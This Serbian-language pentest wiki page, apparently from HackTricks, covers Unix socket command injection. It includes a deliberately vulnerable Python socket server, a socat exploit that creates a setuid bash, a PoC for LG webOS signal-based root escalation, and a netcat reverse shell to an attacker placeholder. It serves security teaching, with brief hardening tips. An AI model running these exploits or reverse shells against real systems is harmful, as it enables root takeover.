# Socket Command Injection

{{#include ../../banners/hacktricks-training.md}}

## Primer bindovanja Socket-a u Pythonu

U sledećem primeru je kreiran **unix socket** (`/tmp/socket_test.s`) i sve što se **primi** biće **izvršeno** pomoću `os.system`. Znam da ovo nećete naći u prirodi, ali cilj ovog primera je da vidite kako izgleda kod koji koristi unix sockets i kako upravljati ulazom u najgorem mogućem slučaju.
```python:s.py
import socket
import os, os.path
import time
from collections import deque

if os.path.exists("/tmp/socket_test.s"):
os.remove("/tmp/socket_test.s")

server = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
server.bind("/tmp/socket_test.s")
os.system("chmod o+w /tmp/socket_test.s")
while True:
server.listen(1)
conn, addr = server.accept()
datagram = conn.recv(1024)
if datagram:
print(datagram)
os.system(datagram)
conn.close()
```
**Pokrenite** kod koristeći python: `python s.py` i **proverite kako socket sluša**:
```python
netstat -a -p --unix | grep "socket_test"
(Not all processes could be identified, non-owned process info
will not be shown, you would have to be root to see it all.)
unix  2      [ ACC ]     STREAM     LISTENING     901181   132748/python        /tmp/socket_test.s
```
**Exploit**
```python
echo "cp /bin/bash /tmp/bash; chmod +s /tmp/bash; chmod +x /tmp/bash;" | socat - UNIX-CLIENT:/tmp/socket_test.s
```
## Studija slučaja: Root-owned UNIX socket signal-triggered escalation (LG webOS)

Neki privilegovani daemoni izlažu root-owned UNIX socket koji prihvata nepouzdan ulaz i povezuje privilegovane akcije sa thread-IDs i signalima. Ako protokol dozvoljava neprivilegovanom klijentu da utiče na to koji native thread će biti meta, moguće je pokrenuti privilegovani kod i izvršiti eskalaciju.

Uočen obrazac:
- Poveži se na root-owned socket (npr. /tmp/remotelogger).
- Kreiraj thread i pribavi njegov native thread id (TID).
- Pošalji TID (packed) plus padding kao request; primi acknowledgement.
- Pošalji određeni signal tom TID-u da pokrene privilegovano ponašanje.

Skica minimalnog PoC-a:
```python
import socket, struct, os, threading, time
# Spawn a thread so we have a TID we can signal
th = threading.Thread(target=time.sleep, args=(600,)); th.start()
tid = th.native_id  # Python >=3.8
s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
s.connect("/tmp/remotelogger")
s.sendall(struct.pack('<L', tid) + b'A'*0x80)
s.recv(4)  # sync
os.kill(tid, 4)  # deliver SIGILL (example from the case)
```
Da biste ovo pretvorili u root shell, može se upotrebiti jednostavan named-pipe + nc pattern:
```bash
rm -f /tmp/f; mkfifo /tmp/f
cat /tmp/f | /bin/sh -i 2>&1 | nc <ATTACKER-IP> 23231 > /tmp/f
```
Napomene:
- Ova klasa ranjivosti nastaje kada se veruje vrednostima izvedenim iz stanja neprivilegovanog klijenta (TIDs) i povezuje ih sa privilegovanim obrađivačima signala ili logikom.
- Ojačajte primenom kredencijala na socketu, validacijom formata poruka i razdvajanjem privilegovanih operacija od spolja dostavljenih identifikatora niti.

## References

- [LG WebOS TV Path Traversal, Authentication Bypass and Full Device Takeover (SSD Disclosure)](https://ssd-disclosure.com/lg-webos-tv-path-traversal-authentication-bypass-and-full-device-takeover/)

{{#include ../../banners/hacktricks-training.md}}
